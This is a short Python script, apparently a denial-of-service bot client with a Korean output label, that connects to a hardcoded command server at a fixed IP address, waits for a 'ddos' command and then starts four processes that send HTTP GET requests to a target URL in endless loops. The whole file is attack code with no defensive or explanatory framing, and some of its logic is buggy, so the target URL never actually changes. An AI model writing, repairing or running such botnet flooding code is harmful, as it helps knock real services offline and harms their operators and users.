from socket import *
import threading
from multiprocessing import Process, Queue
import requests
import time
import sys

s_socket = socket(AF_INET, SOCK_STREAM)
bufsize=1024
host = '182.230.134.78'
port = 12345
url = ""

def get_flooding():
  while(True):
    URL = "http://182.230.134.78:8080"
    if(len(url) == 0):
      response = requests.get(URL) 
    else:
       response = requests.get(url)

def data_recv() :
  while True:
    get_data = s_socket.recv(1024)
    print("응답 : " + get_data.decode('utf-8'))
    ans = get_data.decode('utf-8')
    parsing = ans.split(" ")
    if(parsing[0] == 'ddos'):
      url = parsing[2]
      for i in range(1,5):
        t = Process(target=get_flooding)
        t.start()
      # get_flooding()
    elif(get_data.decode('utf-8') == 'quit'):
      t.close()
      sys.exit()

s_socket.connect((host,port))
t=threading.Thread(target=data_recv)
t.daemon=True
t.start()

if __name__ == '__main__':
  while True:
    st=input("")
    s_socket.send(st.encode('utf-8'))
  s_socket.close()